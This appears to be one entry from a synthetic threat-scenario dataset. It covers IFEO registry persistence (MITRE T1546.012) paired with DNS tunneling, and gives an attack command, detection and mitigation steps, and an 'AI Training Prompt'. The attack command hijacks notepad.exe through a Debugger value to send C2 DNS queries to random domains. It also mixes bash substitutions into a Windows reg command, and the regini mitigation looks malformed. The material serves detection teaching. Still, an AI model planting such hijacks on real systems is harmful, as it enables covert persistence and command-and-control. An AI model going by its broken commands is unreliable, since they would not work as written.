---
type: campaign
scenario_id: 453
tactic: Persistence
technique: "T1546.012: Image File Execution Options Injection"
technique_id: T1546.012
tags: [campaign, lotl, persistence]
---

# Using IFEO to inject DNS tunneling executable.

## Threat Description
Using IFEO to inject DNS tunneling executable.

## Attack Command
```
reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe /v Debugger /t REG_SZ /d "nslookup -type=SRV _$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)._tcp.$(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)" /f
```

## Detection Logic
Monitor IFEO registry: `reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe | findstr nslookup`; Event ID 4657.

## Mitigation
Restrict IFEO writes: `regini -h deny HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`; Audit registry changes: `auditpol /set /subcategory:'Registry' /success:enable`.

## AI Training Prompt
Train AI to detect IFEO-based DNS tunneling persistence by analyzing registry changes, nslookup SRV queries, and DNS traffic patterns; suggest registry protections.

## References
- MITRE ATT&CK T1546.012: https://attack.mitre.org/techniques/T1546/012/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
